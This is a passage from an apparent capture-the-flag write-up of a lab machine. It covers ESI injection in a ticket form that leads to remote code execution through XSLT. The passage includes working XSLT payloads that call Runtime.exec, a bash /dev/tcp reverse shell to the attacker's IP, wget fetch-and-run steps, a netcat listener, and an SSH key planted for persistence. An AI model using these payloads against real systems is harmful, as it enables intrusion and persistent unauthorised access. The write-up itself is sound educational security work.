2. The ID, status, title, and message are stored and displayed back to me when I search for them on the front page.

I went into Burp and sent the POST request to create a ticket to Burp. I submitted the following POST body:

![Pasted image 20260511150322.png](/ob/Pasted%20image%2020260511150322.png)

The response was perfect:

```
<script>alert("Ticket NO : \"TKT-1234<this is a test>\" raised. We will answer you as soon as possible");window.location.href="/home.php";</script>
```

I can see the `<this is a test>` tags perfectly intact. That means that the edge device would have seen this and processed it. To test, I created `poc.html`:

```
┌──(root㉿kali)-[~/Desktop]
└─# echo '<b>pwned</b>' > poc.html
```

```
┌──(root㉿kali)-[~/Desktop]
└─# mv poc.html   /var/www/html     
```

{{< code >}}\
title=test\&msg=\<esi:include src="http://10.10.14.47/poc.html" />\&id=TKT-7264\
{{< /code >}}

![Pasted image 20260511150820.png](/ob/Pasted%20image%2020260511150820.png)

#### XSLT to RCE POC

To get RCE, I’ll include an ESI tag that looks like this:

```
<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/esi.xsl">
</esi:include>
```

The first argument, `src` can be anything, but it has to resolve. Both `localhost` and `10.10.14.47` work. The second is the XSLT I’m going to load.

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo vim /var/www/html/esi.xsl
                                                                                                                                                                                 
┌──(root㉿kali)-[~/Desktop]
└─# cat /var/www/html/esi.xsl
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[ping -c 2 10.10.16.48]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```

{{< code >}}\
POST /ticket.php HTTP/1.1

Host: 10.129.185.105:9001

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 128

Origin: http://10.129.185.105:9001

Connection: keep-alive

Referer: http://10.129.185.105:9001/ticket.php

Cookie: PHPSESSID=3b16c5h54k3cakdfvr6gk2r7kl

Upgrade-Insecure-Requests: 1

Priority: u=0, i

title=test\&msg=testsss\&id=TKT-7263;\<esi:include src="http://localhost/" stylesheet="http://10.10.16.48/esi.xsl">

\</esi:include>\
{{< /code >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
03:28:39.130373 IP portal.quick.htb > portal.quick.htb: ICMP echo request, id 2786, seq 1, length 64
03:28:39.130415 IP portal.quick.htb > portal.quick.htb: ICMP echo reply, id 2786, seq 1, length 64
03:28:44.027941 IP portal.quick.htb > portal.quick.htb: ICMP echo request, id 2787, seq 1, length 64
03:28:44.027992 IP portal.quick.htb > portal.quick.htb: ICMP echo reply, id 2787, seq 1, length 64
03:28:45.401293 IP portal.quick.htb > portal.quick.htb: ICMP echo request, id 2787, seq 2, length 64
03:28:45.401338 IP portal.quick.htb > portal.quick.htb: ICMP echo reply, id 2787, seq 2, length 64

```

```
┌──(root㉿portal)-[~/Desktop]
└─# cat /var/www/html/shell
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.48/443 0>&1

```

\`\`\
`/var/www/html/shellup.xsl`

```
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[wget http://10.10.16.48/shell -O /tmp/a.sh]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```

`/var/www/html/shellrun.xsl`

```
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[bash /tmp/a.sh]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

```
┌──(root㉿kali)-[~/Desktop]
└─# nc -lnvp 443           
listening on [any] 443 ...
connect to [10.10.16.48] from (UNKNOWN) [10.129.185.105] 53934
bash: cannot set terminal process group (1296): Inappropriate ioctl for device
bash: no job control in this shell
sam@quick:~$ 

```

### General Enumeration

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-General-Enumeration" >}} Only with the Linux internal tools to discover the the subdomain of printerv2.quick.htb in apache 's 000-default.conf is opening on port 9001 due to the ps auxxx found the ESIGate server , so I can build the ssh tunnel to connect

{{< /toggle >}}

```
sam@quick:~$ uname -a 
uname -a 
Linux quick 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```
sam@quick:~$ ss -tlap 
ss -tlap 
State     Recv-Q Send-Q             Local Address:Port             Peer Address:Port                                                                                                                                                            
LISTEN    0      128                    127.0.0.1:http                  0.0.0.0:*                                                                                                                                                               
LISTEN    0      128                127.0.0.53%lo:domain                0.0.0.0:*                                                                                                                                                               
LISTEN    0      128                      0.0.0.0:ssh                   0.0.0.0:*                                                                                                                                                               
LISTEN    0      128                    127.0.0.1:40705                 0.0.0.0:*                                                                                                                                                               
LISTEN    0      80                     127.0.0.1:mysql                 0.0.0.0:*                                                                                                                                                               
TIME-WAIT 0      0                      127.0.0.1:http                127.0.0.1:41760                                                                                                                                                           
ESTAB     0      0                 10.129.185.105:53934             10.10.16.48:https                                                                            users:(("bash",pid=3125,fd=255),("bash",pid=3125,fd=2),("bash",pid=3125,fd=1),("bash",pid=3125,fd=0))
TIME-WAIT 0      0                      127.0.0.1:http                127.0.0.1:41770                                                                                                                                                           
TIME-WAIT 0      0                      127.0.0.1:http                127.0.0.1:41752                                                                                                                                                           
FIN-WAIT-20      0                      127.0.0.1:http                127.0.0.1:41772                                                                                                                                                           
ESTAB     0      10                10.129.185.105:54310             10.10.16.48:https                                                                            users:(("ss",pid=3396,fd=2),("ss",pid=3396,fd=1),("ss",pid=3396,fd=0),("bash",pid=3360,fd=255),("bash",pid=3360,fd=2),("bash",pid=3360,fd=1),("bash",pid=3360,fd=0))
SYN-SENT  0      1                 10.129.185.105:33186                 8.8.8.8:domain                                                                                                                                                          
LISTEN    0      50            [::ffff:127.0.0.1]:tproxy                      *:*                                                                                users:(("java",pid=1308,fd=35))                                                
LISTEN    0      128                         [::]:ssh                      [::]:*                                                                                                                                                               
LISTEN    0      128                            *:9001                        *:*                                                                                users:(("java",pid=1308,fd=25))                                                
CLOSE-WAIT1      0        [::ffff:10.129.185.105]:43062    [::ffff:10.10.16.48]:http                                                                             users:(("java",pid=1308,fd=44))                                                
CLOSE-WAIT1      0             [::ffff:127.0.0.1]:41772      [::ffff:127.0.0.1]:http                                                                             users:(("java",pid=1308,fd=34))                                                
sam@quick:~$ 

```

```
sam@quick:~$ ls /etc/apache2/sites-available
ls /etc/apache2/sites-available
000-default.conf
default-ssl.conf
```

`000-default.conf`

```
sam@quick:~$ cat /etc/apache2/sites-available/000-default.conf
cat /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

```
┌──(root㉿kali)-[~/Desktop]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.16.48] from (UNKNOWN) [10.129.185.105] 54434
bash: cannot set terminal process group (1296): Inappropriate ioctl for device
bash: no job control in this shell
sam@quick:~$ ps auxxx
ps auxxx
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.2 159732  9224 ?        Ss   07:09   0:03 /sbin/init auto automatic-ubiquity noprompt
root          2  0.0  0.0      0     0 ?        S    07:09   0:00 [kthreadd]
root          4  0.0  0.0      0     0 ?        I<   07:09   0:00 [kworker/0:0H]
root          6  0.0  0.0      0     0 ?        I<   07:09   0:00 [mm_percpu_wq]
root          7  0.0  0.0      0     0 ?        S    07:09   0:00 [ksoftirqd/0]
root          8  0.0  0.0      0     0 ?        I    07:09   0:01 [rcu_sched]
root          9  0.0  0.0      0     0 ?        I    07:09   0:00 [rcu_bh]
root         10  0.0  0.0      0     0 ?        S    07:09   0:00 [migration/0]
root         11  0.0  0.0      0     0 ?        S    07:09   0:00 [watchdog/0]
root         12  0.0  0.0      0     0 ?        S    07:09   0:00 [cpuhp/0]
root         13  0.0  0.0      0     0 ?        S    07:09   0:00 [cpuhp/1]
root         14  0.0  0.0      0     0 ?        S    07:09   0:00 [watchdog/1]
root         15  0.0  0.0      0     0 ?        S    07:09   0:00 [migration/1]
root         16  0.0  0.0      0     0 ?        S    07:09   0:00 [ksoftirqd/1]
root         18  0.0  0.0      0     0 ?        I<   07:09   0:00 [kworker/1:0H]
root         19  0.0  0.0      0     0 ?        S    07:09   0:00 [kdevtmpfs]
root         20  0.0  0.0      0     0 ?        I<   07:09   0:00 [netns]
root         21  0.0  0.0      0     0 ?        S    07:09   0:00 [rcu_tasks_kthre]
root         22  0.0  0.0      0     0 ?        S    07:09   0:00 [kauditd]
root         24  0.0  0.0      0     0 ?        S    07:09   0:00 [khungtaskd]
root         25  0.0  0.0      0     0 ?        S    07:09   0:00 [oom_reaper]
root         26  0.0  0.0      0     0 ?        I<   07:09   0:00 [writeback]
root         27  0.0  0.0      0     0 ?        S    07:09   0:00 [kcompactd0]
root         28  0.0  0.0      0     0 ?        SN   07:09   0:00 [ksmd]
root         29  0.0  0.0      0     0 ?        SN   07:09   0:00 [khugepaged]
root         30  0.0  0.0      0     0 ?        I<   07:09   0:00 [crypto]
root         31  0.0  0.0      0     0 ?        I<   07:09   0:00 [kintegrityd]
root         32  0.0  0.0      0     0 ?        I<   07:09   0:00 [kblockd]
root         33  0.0  0.0      0     0 ?        I<   07:09   0:00 [ata_sff]
root         34  0.0  0.0      0     0 ?        I<   07:09   0:00 [md]
root         35  0.0  0.0      0     0 ?        I<   07:09   0:00 [edac-poller]
root         36  0.0  0.0      0     0 ?        I<   07:09   0:00 [devfreq_wq]
root         37  0.0  0.0      0     0 ?        I<   07:09   0:00 [watchdogd]
root         41  0.0  0.0      0     0 ?        S    07:09   0:00 [kswapd0]
root         42  0.0  0.0      0     0 ?        I<   07:09   0:00 [kworker/u257:0]
root         43  0.0  0.0      0     0 ?        S    07:09   0:00 [ecryptfs-kthrea]
root         85  0.0  0.0      0     0 ?        I<   07:09   0:00 [kthrotld]
root         86  0.0  0.0      0     0 ?        I<   07:09   0:00 [acpi_thermal_pm]
root         87  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_0]
root         88  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_0]
root         89  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_1]
root         90  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_1]
root         96  0.0  0.0      0     0 ?        I<   07:09   0:00 [ipv6_addrconf]
root        105  0.0  0.0      0     0 ?        I<   07:09   0:00 [kstrp]
root        122  0.0  0.0      0     0 ?        I<   07:09   0:00 [charger_manager]
root        175  0.0  0.0      0     0 ?        I<   07:09   0:00 [mpt_poll_0]
root        176  0.0  0.0      0     0 ?        I<   07:09   0:00 [mpt/0]
root        214  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_2]
root        215  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_2]
root        216  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_3]
root        217  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_3]
root        218  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_4]
root        219  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_4]
root        220  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_5]
root        221  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_5]
root        222  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_6]
root        223  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_6]
root        224  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_7]
root        225  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_7]
root        226  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_8]
root        227  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_8]
root        228  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_9]
root        229  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_9]
root        230  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_10]
root        231  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_10]
root        232  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_11]
root        233  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_11]
root        234  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_12]
root        235  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_12]
root        236  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_13]
root        237  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_13]
root        238  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_14]
root        239  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_14]
root        240  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_15]
root        241  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_15]
root        242  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_16]
root        243  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_16]
root        244  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_17]
root        245  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_17]
root        246  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_18]
root        247  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_18]
root        248  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_19]
root        249  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_19]
root        250  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_20]
root        251  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_20]
root        252  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_21]
root        253  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_21]
root        254  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_22]
root        255  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_22]
root        256  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_23]
root        257  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_23]
root        258  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_24]
root        259  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_24]
root        260  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_25]
root        261  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_25]
root        262  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_26]
root        263  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_26]
root        264  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_27]
root        265  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_27]
root        266  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_28]
root        267  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_28]
root        268  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_29]
root        269  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_29]
root        270  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_30]
root        271  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_30]
root        272  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_31]
root        273  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_31]
root        274  0.0  0.0      0     0 ?        S    07:09   0:00 [scsi_eh_32]
root        275  0.0  0.0      0     0 ?        I<   07:09   0:00 [scsi_tmf_32]
root        303  0.0  0.0      0     0 ?        I<   07:09   0:00 [ttm_swap]
root        304  0.0  0.0      0     0 ?        S    07:09   0:00 [irq/16-vmwgfx]
root        307  0.0  0.0      0     0 ?        I<   07:09   0:00 [kworker/1:1H]
root        309  0.0  0.0      0     0 ?        I<   07:09   0:00 [kworker/0:1H]
root        377  0.0  0.0      0     0 ?        I<   07:09   0:00 [raid5wq]
root        425  0.0  0.0      0     0 ?        S    07:09   0:00 [jbd2/sda2-8]
root        426  0.0  0.0      0     0 ?        I<   07:09   0:00 [ext4-rsv-conver]
root        493  0.0  0.3 127744 15352 ?        S<s  07:09   0:00 /lib/systemd/systemd-journald
root        495  0.0  0.0      0     0 ?        I<   07:09   0:00 [iscsi_eh]
root        496  0.0  0.0      0     0 ?        I<   07:09   0:00 [ib-comp-wq]
root        497  0.0  0.0      0     0 ?        I<   07:09   0:00 [ib-comp-unb-wq]
root        498  0.0  0.0      0     0 ?        I<   07:09   0:00 [ib_mcast]
root        499  0.0  0.0      0     0 ?        I<   07:09   0:00 [ib_nl_sa_wq]
root        500  0.0  0.0      0     0 ?        I<   07:09   0:00 [rdma_cm]
root        506  0.0  0.0      0     0 ?        I    07:09   0:00 [kworker/0:2]
root        507  0.0  0.0  97708  1884 ?        Ss   07:09   0:00 /sbin/lvmetad -f
root        522  0.0  0.1  48180  6932 ?        Ss   07:09   0:01 /lib/systemd/systemd-udevd
root        536  0.0  0.0      0     0 ?        S<   07:09   0:00 [loop0]
systemd+    591  0.0  0.0 141932  3188 ?        Ssl  07:09   0:00 /lib/systemd/systemd-timesyncd
root        626  0.0  0.2  89864  9844 ?        Ss   07:09   0:00 /usr/bin/VGAuthService
root        627  0.0  0.1 225724  7140 ?        Ssl  07:09   0:03 /usr/bin/vmtoolsd
root        698  0.0  0.0      0     0 ?        I    07:09   0:03 [kworker/1:3]
systemd+    798  0.0  0.1  71852  5272 ?        Ss   07:09   0:00 /lib/systemd/systemd-networkd
systemd+    908  0.0  0.1  70892  6292 ?        Ss   07:09   0:00 /lib/systemd/systemd-resolved
root        932  0.0  0.0  25992  3584 ?        Ss   07:09   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root       1152  0.0  0.0 161076  1676 ?        Ssl  07:09   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       1161  0.0  0.4 169100 17176 ?        Ssl  07:09   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       1167  0.0  0.1 286256  6924 ?        Ssl  07:09   0:00 /usr/lib/accountsservice/accounts-daemon
daemon     1193  0.0  0.0  28332  2452 ?        Ss   07:09   0:00 /usr/sbin/atd -f
root       1194  0.0  0.1  62152  5716 ?        Ss   07:09   0:00 /lib/systemd/systemd-logind
syslog     1195  0.0  0.1 263040  4652 ?        Ssl  07:09   0:00 /usr/sbin/rsyslogd -n
root       1223  0.0  0.0  30028  3232 ?        Ss   07:09   0:00 /usr/sbin/cron -f
root       1254  0.0  0.0  57500  3316 ?        S    07:09   0:00 /usr/sbin/CRON -f
root       1255  0.0  0.7 1335852 29352 ?       Ssl  07:09   0:01 /usr/lib/snapd/snapd
root       1258  0.0  0.0 110548  2056 ?        Ssl  07:09   0:00 /usr/sbin/irqbalance --foreground
message+   1270  0.0  0.1  50060  4596 ?        Ss   07:09   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
sam        1296  0.0  0.0   4628   876 ?        Ss   07:09   0:00 /bin/sh -c /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
sam        1308  0.7  4.4 3672256 178848 ?      Sl   07:09   0:32 /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
root       1325  0.0  1.0 1034316 41628 ?       Ssl  07:09   0:01 /usr/bin/containerd
root       1343  0.0  2.1 1273752 85984 ?       Ssl  07:09   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root       1358  0.0  0.1  72300  5756 ?        Ss   07:09   0:00 /usr/sbin/sshd -D
root       1389  0.0  0.0  14888  1992 tty1     Ss+  07:09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       1390  0.0  0.1 288884  6676 ?        Ssl  07:09   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql      1435  0.0  4.7 1621616 189948 ?      Sl   07:09   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       1440  0.0  0.5 376244 22860 ?        Ss   07:09   0:00 /usr/sbin/apache2 -k start
www-data   1482  0.0  0.2 380648 11652 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
www-data   1485  0.0  0.2 380648 11652 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
www-data   1486  0.0  0.2 380648 11652 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
root       2068  0.0  0.0 478532  3488 ?        Sl   07:09   0:00 /usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.23.0.3 -container-port 443
root       2099  0.0  0.1   9364  5716 ?        Sl   07:09   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/3d2bd400b4cf46ff776a265ca6756516b0fbc535649db80727a993ca745c54f1 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root       2100  0.0  0.1   9364  5948 ?        Sl   07:09   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/80960fc563ef1df8ca60c5bf4280b509b0562556033ca685a992d3a00ce2cb47 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root       2145  0.0  0.5  80228 21408 ?        Ss   07:09   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
systemd+   2152  0.0  0.1  14680  7620 ?        Ss   07:09   0:00 nginx: master process nginx -g daemon off;
www-data   2284  0.0  0.1  80228  6164 ?        S    07:09   0:00 php-fpm: pool www
www-data   2285  0.0  0.1  80228  6164 ?        S    07:09   0:00 php-fpm: pool www
systemd+   2303  0.0  0.0  15176  2748 ?        S    07:09   0:00 nginx: worker process
www-data   2593  0.0  0.2 380648 11660 ?        S    07:14   0:00 /usr/sbin/apache2 -k start
www-data   2652  0.0  0.2 380648 11660 ?        S    07:18   0:00 /usr/sbin/apache2 -k start
www-data   2655  0.0  0.2 380648 11660 ?        S    07:18   0:00 /usr/sbin/apache2 -k start
www-data   2656  0.0  0.2 380648 11660 ?        S    07:18   0:00 /usr/sbin/apache2 -k start
www-data   2659  0.0  0.2 380648 11660 ?        S    07:18   0:00 /usr/sbin/apache2 -k start
www-data   2661  0.0  0.2 380648 11660 ?        S    07:18   0:00 /usr/sbin/apache2 -k start
www-data   2662  0.0  0.2 380648 11660 ?        S    07:18   0:00 /usr/sbin/apache2 -k start
root       2730  0.0  0.0      0     0 ?        I    07:24   0:00 [kworker/0:0]
root       2990  0.0  0.0      0     0 ?        I    07:39   0:00 [kworker/1:0]
root       3074  0.0  0.0      0     0 ?        I    07:46   0:00 [kworker/u256:1]
sam        3124  0.0  0.0  11592  3068 ?        S    07:51   0:00 bash /tmp/a.sh
sam        3125  0.0  0.1  21232  4968 ?        S    07:51   0:00 bash -i
root       3145  0.0  0.0      0     0 ?        I    07:52   0:00 [kworker/u256:2]
www-data   3427  0.0  0.3 381208 13580 ?        S    08:21   0:00 /usr/sbin/apache2 -k start
sam        3428  0.0  0.0  11592  3180 ?        S    08:21   0:00 bash /tmp/a.sh
sam        3430  0.3  0.1  21232  5008 ?        S    08:21   0:00 bash -i
sam        3440  0.0  0.0  38376  3628 ?        R    08:21   0:00 ps auxxx

```

I’ll keep an eye out for ways to pivot to srvadm. Taking a look at the process list (`ps auxww`) was a good way to see various parts of the box running. There’s ESIGate software, running as sam:

```
sam        1308  0.7  4.4 3672256 178848 ?      Sl   07:09   0:32 /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
```

The top block is the site I’ve been interacting with. But the bottom one is new. It’s also running as srvadm.

```
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
```

I’ll add `printerv2.quick.htb` to `/etc/hosts`, but I still can’t connect to it on TCP 80 or 9001. Since I know that the ESIGate is listening on 9001 and forwarding to `http://localhost:80` from the config file from the process list:

It’s possible that ESI isn’t letting things through with the right vhost? Either way, I’ll want to tunnel to get to this vhost on localhost port 80. I’ll create a `.ssh` directory in sam’s homedir, and drop my public key into `authorized keys`. Because I got tired of doing this each time I walked away, I created two `.xsl` files that will create the directory and then upload my key into `authorized_keys`:

### SSH tunnel

```
sam@quick:~$ mkdir .ssh
mkdir .ssh
sam@quick:~$ 
```

back to kali

```
┌──(root㉿kali)-[~/Desktop]
└─# ssh-keygen -t ed25519 -C "tester@kali-$(date +%Y%m%d)"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
/root/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:Ema5YD0BZs/g20X4zbSY8yw76KOzM1W9hQUbHRmFGJs tester@kali-20260511
The key's randomart image is:
+--[ED25519 256]--+
|    =.... +=o*.  |
|   + =.+  o==    |
|    + X..BE+     |
|   . * =* * .    |
|    . +.S+ o     |
|      ... +      |
|     . . o       |
|    + o o        |
|    oB.. .       |
+----[SHA256]-----+
```

```
┌──(root㉿kali)-[~/.ssh]
└─# cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICjxnbwlnRqSdAlqARpmujORsaBbbzZNia2RZ0EZety7 tester@kali-20260511
```

use the copy and paste is more easily

```
sam@quick:~$ cd .ssh
cd .ssh
sam@quick:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICjxnbwlnRqSdAlqARpmujORsaBbbzZNia2RZ0EZety7 tester@kali-20260511' > authorized_keys
```

```
sam@quick:~/.ssh$ chmod 700 ~/.ssh                           
sam@quick:~/.ssh$ chmod 600 ~/.ssh/authorized_keys

```

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i ~/.ssh/id_ed25519  sam@10.129.185.105   
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May 11 08:43:35 UTC 2026

  System load:                    0.0
  Usage of /:                     69.9% of 7.75GB
